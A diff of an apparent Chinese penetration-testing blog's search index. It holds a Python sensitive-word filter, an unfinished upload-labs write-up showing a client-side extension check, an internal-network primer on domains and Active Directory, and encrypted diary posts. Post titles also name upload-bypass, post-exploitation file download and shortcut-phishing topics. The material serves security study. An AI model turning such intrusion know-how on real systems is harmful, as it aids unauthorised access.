+  <entry>
     <title>文件上传(一)之绕过姿势</title>
     <url>/posts/62304.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势。</p>
@@ -2731,32 +2757,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>敏感词替换</title>
-    <url>/posts/31986.html</url>
-    <content><![CDATA[<h2 id="流程以及思路确定"><a href="#流程以及思路确定" class="headerlink" title="流程以及思路确定"></a>流程以及思路确定</h2><p>1.用户输入一串文字 ，保存到user_input中<br>2.检查文字是否有敏感词，以及敏感词的具体位置，直接使用relpace方式替换掉敏感词    <a id="more"></a><br>3.一句话中可能含有多个敏感字，这个时候就要重复2的步骤。<br>4.使用 * *len（str） 替换掉敏感词对应的个数。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># encoding:utf-8   </span><br><span class="line">user_input &#x3D; input(&#39;请输入:&#39;)   </span><br><span class="line">for filter_word in open(&#39;filter.txt&#39;):</span><br><span class="line">    filter &#x3D; filter_word.rstrip()</span><br><span class="line">    if filter in user_input:</span><br><span class="line">        filter_len &#x3D; len(filter)</span><br><span class="line">        user_input &#x3D; user_input.replace(filter,&#39;*&#39;*filter_len)</span><br><span class="line">else:</span><br><span class="line">    print(user_input)</span><br></pre></td></tr></table></figure>
-
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol>
-<li>python中文件的读取<br>函数open(filename,mode)用于读取文件，返回一个file object。 所以现在我们的filter.txt是一个文件对象<br>参数filename:是一个字符串，用来代表文件名.<br>参数mode:决定了打开文件的方式，比如只读(r)， 写入(w)， 追加等。</li>
-<li>rstrip()方法<br>Python rstrip() 删除 string 字符串末尾的指定字符（默认为空格）.<br>基本格式：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str.rstrip([chars])</span><br></pre></td></tr></table></figure>
-<ul>
-<li>chars – 指定删除的字符（默认为空格）</li>
-<li>返回删除 string 字符串末尾的指定字符后生成的新字符串</li>
-</ul>
-</li>
-<li>replace()方法<br>Python replace() 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。<br>基本格式：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STR.REPLACE(OLD, NEW[, MAX])</span><br></pre></td></tr></table></figure>
-<ul>
-<li>old – 将被替换的子字符串。</li>
-<li>new – 新字符串，用于替换old子字符串。</li>
-<li>max – 可选字符串, 替换不超过 max 次</li>
-<li>返回字符串中的 old（旧字符串） 替换成 new(新字符串)后生成的新字符串，如果指定第三个参数max，则替换不超过 max 次。</li>
-</ul>
-</li>
-<li>for …else…<br>只有当循环里没有遇到 break 时，else 块才会执行。<br>当你想在房间里找某样东西时，只要在任意位置找到了，就停止继续搜查工作。但如果把整个房间都翻遍了，还没找到我们想要的东西，需要告诉人家说：这儿没有你要找的东西。<br>遇到这样的情况用 for … else ，除此之外，最好不要用它</li>
-</ol>
-]]></content>
-  </entry>
-  <entry>
     <title>文件下载</title>
     <url>/posts/18452.html</url>
     <content><![CDATA[<h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于渗透测试来说，当我们拿到的目标权限过低，会很难进行下一步动作，便需要使用其他利器继续进行提权等操作，当需要将文件下载到目标机器时，就会用到文件下载命令。</p>
@@ -2804,62 +2804,6 @@ string substr(string, start, length)
 ]]></content>
   </entry>
   <entry>
-    <title>文件上传(二)之实战篇</title>
-    <url>/posts/31481.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近打了场XCTF，看到同学在群里交流，自己不自觉留下来没有技术的泪水。。。<br>好吧，那就开始学吧。。。在网上找到一个不错的上传漏洞汇总的靶场，在本地搭建好环境，开始闭关。。。。。。</p>
-<p>靶场源码地址：<code>github.com/c0ny1/upload-labs</code></p>
-<p>我下载的是靶主已经集成配置好的环境进行本地搭建。</p>
-<p>地址：<code>github.com/c0ny1/upload-labs/releases</code></p>
-<p><img src="/posts/31481/%E4%B8%8A%E4%BC%A01.png" alt="界面"></p>
-<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><img src="/posts/31481/%E4%B8%8A%E4%BC%A02.jpg" alt><br>上传一个<code>2.php</code>文件<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt><br>查看提示：<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt></p>
-<p>查看源码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>发现只允许上传<code>.jpg|.png|.gif</code>类型的文件</p>
-<p>未完。。。。。。</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>日志</title>
-    <url>/posts/32353.html</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="" />
-    <label for="hbePass">输入密码，查看文章！</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="590af197c0d25f07a914ca58a23ef67b13e9092a2528af3c31ee0042bcad7a27">b3b84fb212479cf3c064455b955375aaf40dc952baa91f6570486afb9a397309758d96362ef6660259596c86bd09048ed30483ed1f77a9b8ad6413e13e82cff86fc2711dc94ee86d4d54f50d091ac50d0a5c58911caff25c0ffee44452de32165037d8ae344ccb13ab2a296bbd27f7d572ba0b4b76023f9d80fe9cc9064edb1f4ee744953dfb3060b698b57e1e4c8f357e420c1602361540e4bf51caa7f35ae942b4bae57cddaee3c910e6fc89dd235226c60bbfada7c0a0be960650d26a91db0bc79d785aa0ead60b9c229e90c5ecb9624781ff0704747cf2829822f8a332af54abf50766dd5ced1deda74404fd33bbead5e0bc817e0b38224adc5bf109ddc25232b0f1cf705eabf8bffa5ccb64c0f9182b34731276992b834e36c8ba949f971d54ea33b905086c68ddc1f9366130408fb1bd232ed5633c64409ecbadf03f57291eeadb9b69900eb658819a6faea4e32aca95f1401967c15b36a139334f9bf8be5bd0a53f486486f347467f1ceeee64ea3688ccf9c1a00e439fca6f4c72af07a8a1dd0f79cb7037cf379e4d50ffb636b2e596e7e1ebe68e5cfb20e157e29b60a18ef1964f16a1af3ff9af1f34e780d1ba87d85d211b02cd64e9719eecf2336a6e05bb4b920bdeeeeab23229628914868cda521fc346583bbd02f9480f1a3934f31f6e67032519ebe6992588941e9fe69cd20e6e111b2144f5703d5d6d952391b9478bf1edf7281ba261df96b946d85c0eb58da7d1812c2346b87b69d2984945f6c846d39eda5012c70bf5d515ea291293e47f24cb10c93867ba05eba50852bcac3198fa2142da73a9e42ac9d64767dce4ec97cefcc7dfc9ba965a2819ba5b3ff1d9b90c6d69517e36bc707366f0a77afb792f011078ff91dbaaccfc3b55e23e1378d9279c9990a38fe7528855756fcfbff846c820a2ba2bb491c3fbe14c971b45c41bda1e36afdea03a0ba4d0f6226662c27b9f64af86c5b96240c8a95fa6b122a77c76ed3ffbd555a75a5b114e5fc2dfd21db23085b53ac7df7f22a4405491f567839c8ff5122270c01ec32125a0ff86d114371524335ad6e2e722964f6301680a8aacfbef44287a1794e1f7f58d0b4e611469002dfb3526e16d8c1d02388af1b8a06b7ee5849aebd566564f8d80ee5aaa67af4feee6513a748d9e740b384f4467d5cb61caca05801c23bc86c8e16cae5c0d32f4d4475f8a92083caf05f09cf659d382ef0e2b9987cc8a06c6fb7ab456495eb86cf228cd79e9bce79e3b3ee759f96ee8271a676c4c5676bd972e987985b376a72afcbc537e6f42ba6e9b4ab1f05f9d070dd9d9b267269aad50d36fa5b9a5b7da932552584afa3f8d2e43d10b34a318a6f82f6958acb17626e4fb96b9b75cc723ac4d8606c5ac021442a98fff5b3df8847d63273b86c26da04d1008d3</script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>日志</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>日常记录</title>
-    <url>/posts/42951.html</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="" />
-    <label for="hbePass">输入密码，查看文章！</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>总结</category>
-      </categories>
-  </entry>
-  <entry>
     <title>文件泄露漏洞</title>
     <url>/posts/56132.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前两天刚做了一道<code>.git</code>文件泄露的题，在网上查了些资料，发现还有其他的文件泄露漏洞，现在来总结一下。</p>
@@ -2891,6 +2835,43 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
+    <title>文件上传(二)之实战篇</title>
+    <url>/posts/31481.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近打了场XCTF，看到同学在群里交流，自己不自觉留下来没有技术的泪水。。。<br>好吧，那就开始学吧。。。在网上找到一个不错的上传漏洞汇总的靶场，在本地搭建好环境，开始闭关。。。。。。</p>
+<p>靶场源码地址：<code>github.com/c0ny1/upload-labs</code></p>
+<p>我下载的是靶主已经集成配置好的环境进行本地搭建。</p>
+<p>地址：<code>github.com/c0ny1/upload-labs/releases</code></p>
+<p><img src="/posts/31481/%E4%B8%8A%E4%BC%A01.png" alt="界面"></p>
+<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><img src="/posts/31481/%E4%B8%8A%E4%BC%A02.jpg" alt><br>上传一个<code>2.php</code>文件<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt><br>查看提示：<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt></p>
+<p>查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现只允许上传<code>.jpg|.png|.gif</code>类型的文件</p>
+<p>未完。。。。。。</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>日常记录</title>
+    <url>/posts/42951.html</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">输入密码，查看文章！</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>总结</category>
+      </categories>
+  </entry>
+  <entry>
     <title>易错知识</title>
     <url>/posts/34260.html</url>
     <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -2902,6 +2883,25 @@ string substr(string, start, length)
   <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script>
 </div>
 <script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+  </entry>
+  <entry>
+    <title>日志</title>
+    <url>/posts/32353.html</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">输入密码，查看文章！</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="590af197c0d25f07a914ca58a23ef67b13e9092a2528af3c31ee0042bcad7a27">b3b84fb212479cf3c064455b955375aaf40dc952baa91f6570486afb9a397309758d96362ef6660259596c86bd09048ed30483ed1f77a9b8ad6413e13e82cff86fc2711dc94ee86d4d54f50d091ac50d0a5c58911caff25c0ffee44452de32165037d8ae344ccb13ab2a296bbd27f7d572ba0b4b76023f9d80fe9cc9064edb1f4ee744953dfb3060b698b57e1e4c8f357e420c1602361540e4bf51caa7f35ae942b4bae57cddaee3c910e6fc89dd235226c60bbfada7c0a0be960650d26a91db0bc79d785aa0ead60b9c229e90c5ecb9624781ff0704747cf2829822f8a332af54abf50766dd5ced1deda74404fd33bbead5e0bc817e0b38224adc5bf109ddc25232b0f1cf705eabf8bffa5ccb64c0f9182b34731276992b834e36c8ba949f971d54ea33b905086c68ddc1f9366130408fb1bd232ed5633c64409ecbadf03f57291eeadb9b69900eb658819a6faea4e32aca95f1401967c15b36a139334f9bf8be5bd0a53f486486f347467f1ceeee64ea3688ccf9c1a00e439fca6f4c72af07a8a1dd0f79cb7037cf379e4d50ffb636b2e596e7e1ebe68e5cfb20e157e29b60a18ef1964f16a1af3ff9af1f34e780d1ba87d85d211b02cd64e9719eecf2336a6e05bb4b920bdeeeeab23229628914868cda521fc346583bbd02f9480f1a3934f31f6e67032519ebe6992588941e9fe69cd20e6e111b2144f5703d5d6d952391b9478bf1edf7281ba261df96b946d85c0eb58da7d1812c2346b87b69d2984945f6c846d39eda5012c70bf5d515ea291293e47f24cb10c93867ba05eba50852bcac3198fa2142da73a9e42ac9d64767dce4ec97cefcc7dfc9ba965a2819ba5b3ff1d9b90c6d69517e36bc707366f0a77afb792f011078ff91dbaaccfc3b55e23e1378d9279c9990a38fe7528855756fcfbff846c820a2ba2bb491c3fbe14c971b45c41bda1e36afdea03a0ba4d0f6226662c27b9f64af86c5b96240c8a95fa6b122a77c76ed3ffbd555a75a5b114e5fc2dfd21db23085b53ac7df7f22a4405491f567839c8ff5122270c01ec32125a0ff86d114371524335ad6e2e722964f6301680a8aacfbef44287a1794e1f7f58d0b4e611469002dfb3526e16d8c1d02388af1b8a06b7ee5849aebd566564f8d80ee5aaa67af4feee6513a748d9e740b384f4467d5cb61caca05801c23bc86c8e16cae5c0d32f4d4475f8a92083caf05f09cf659d382ef0e2b9987cc8a06c6fb7ab456495eb86cf228cd79e9bce79e3b3ee759f96ee8271a676c4c5676bd972e987985b376a72afcbc537e6f42ba6e9b4ab1f05f9d070dd9d9b267269aad50d36fa5b9a5b7da932552584afa3f8d2e43d10b34a318a6f82f6958acb17626e4fb96b9b75cc723ac4d8606c5ac021442a98fff5b3df8847d63273b86c26da04d1008d3</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>日志</tag>
+      </tags>
   </entry>
   <entry>
     <title>构造windows快捷方式钓鱼信</title>
@@ -3215,8 +3215,8 @@ string substr(string, start, length)
         <category>Web</category>
       </categories>
       <tags>
-        <tag>WEB</tag>
         <tag>DVWA</tag>
+        <tag>WEB</tag>
       </tags>
   </entry>
   <entry>
@@ -3955,110 +3955,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>内网渗透基础总结</title>
-    <url>/posts/44578.html</url>
-    <content><![CDATA[<h2 id="0x00-内网"><a href="#0x00-内网" class="headerlink" title="0x00 内网"></a>0x00 内网</h2><p>局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</p>
-<h2 id="0x01-工作组、家庭组、域"><a href="#0x01-工作组、家庭组、域" class="headerlink" title="0x01 工作组、家庭组、域"></a>0x01 工作组、家庭组、域</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><ul>
-<li>所有的计算机都是对等的，没有计算机可以控制另一台计算机。每台计算机都具有一组用户帐户。若要登录到工作组中的任何计算机，您必须具有该计算机上的帐户。</li>
-<li>通常情况下，计算机的数量不超过二十台。</li>
-<li>工作组不受密码保护。</li>
-<li>所有的计算机必须在同一本地网络或子网中。</li>
-</ul>
-<h3 id="家庭组"><a href="#家庭组" class="headerlink" title="家庭组"></a>家庭组</h3><ul>
-<li>家庭网络中的计算机必须属于某个工作组，但它们也可以属于某个家庭组。使用家庭组，可轻松与家庭网络中的其他人共享图片、音乐、视频、文档和打印机。</li>
-<li>家庭组受密码保护，但在将计算机添加到家庭组时，只需要键入一次密码即可。</li>
-</ul>
-<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</p>
-<p>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</p>
-<p>域控制器（ Domain Controller ，简写为 DC ）可以对域内计算机进行集中管理，比如在域控制器上可以定义所有用户不能更改桌面，或者所有用户的密码长度必须8位以上，而工作组环境的计算机则无法做到这些。</p>
-<p>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</p>
-<ul>
-<li>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后， 2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 　　 </li>
-<li>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域;每个域都有自己的安全策略，以及它与其他域的安全信任关系。 </li>
-<li>域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</li>
-</ul>
-<h2 id="0x02-域的分类"><a href="#0x02-域的分类" class="headerlink" title="0x02 域的分类"></a>0x02 域的分类</h2><ul>
-<li>单域</li>
-<li>父域、子域</li>
-<li>域树</li>
-<li>域森林</li>
-<li>DNS域名服务器</li>
-</ul>
-<h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p>
-<p>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</p>
-<h3 id="父域、子域"><a href="#父域、子域" class="headerlink" title="父域、子域"></a>父域、子域</h3><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</p>
-<p>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。</p>
-<p>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</p>
-<p>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</p>
-<p>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p>
-<h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><ul>
-<li><p>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系（Trust Relation）。比如asia.abc.com与Europe.abc.com访问需要建立信任关系</p>
-</li>
-<li><p>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p>
-</li>
-<li><p>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</p>
-</li>
-</ul>
-<p>abc.com 是一级域</p>
-<p>asia是二级域</p>
-<p><img src="/posts/44578/1.png" alt></p>
-<h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p>域森林指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。</p>
-<p><img src="/posts/44578/2.png" alt></p>
-<h3 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h3><ul>
-<li>DNS域名服务器是进行域名和与之对应的IP地址转换的服务器。</li>
-<li>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等等。</li>
-<li>一般情况下，我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为<strong>通常DNS服务器和域控制器会处在同一台机器上</strong>。</li>
-</ul>
-<h2 id="0x03-活动目录-AD"><a href="#0x03-活动目录-AD" class="headerlink" title="0x03 活动目录(AD)"></a>0x03 活动目录(AD)</h2><ul>
-<li>活动目录（Active Directory）是域环境中提供目录服务的组件。</li>
-<li>目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</li>
-<li>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</li>
-</ul>
-<p>**<br>逻辑结构**</p>
-<ul>
-<li>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“<strong>逻辑结构</strong>”。</li>
-<li>活动目录的逻辑结构就包括上面讲到的组织单元（OU）、域（domain）、域树（tree）、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</li>
-</ul>
-<p><strong>活动目录的主要功能</strong></p>
-<ol>
-<li>帐号集中管理，所有帐号均存在服务器上，方便对帐号的重命令/重置密码。</li>
-<li>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择安装软件。</li>
-<li>环境集中管理，利用AD可以统一客户端桌面，IE，TCP/IP等设置。</li>
-<li>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</li>
-<li>更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，岩机时间更少。</li>
-<li>活动目录为Microsoft统一管理的基础平台，其它isa，exchange，sms等服务都依赖于这个基础平台。</li>
-</ol>
-<h2 id="0x04-AD和DC的区别"><a href="#0x04-AD和DC的区别" class="headerlink" title="0x04 AD和DC的区别"></a>0x04 AD和DC的区别</h2><ul>
-<li>如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</li>
-<li>那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</li>
-<li>DC的本质是一台计算机，AD的本质是提供目录服务的组件</li>
-</ul>
-<h2 id="0x05-域相关概念"><a href="#0x05-域相关概念" class="headerlink" title="0x05 域相关概念"></a>0x05 域相关概念</h2><h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p>
-<p><img src="/posts/44578/3.png" alt></p>
-<h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><ul>
-<li>两个防火墙之间的空间被称为DMZ。</li>
-<li>DMZ是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。</li>
-<li>为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</li>
-<li>该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。</li>
-<li>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</li>
-</ul>
-<h2 id="0x06-域中计算机分类"><a href="#0x06-域中计算机分类" class="headerlink" title="0x06 域中计算机分类"></a>0x06 域中计算机分类</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域控制器</span><br><span class="line">成员服务器</span><br><span class="line">客户机</span><br><span class="line">独立服务器</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。</li>
-<li>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</li>
-</ul>
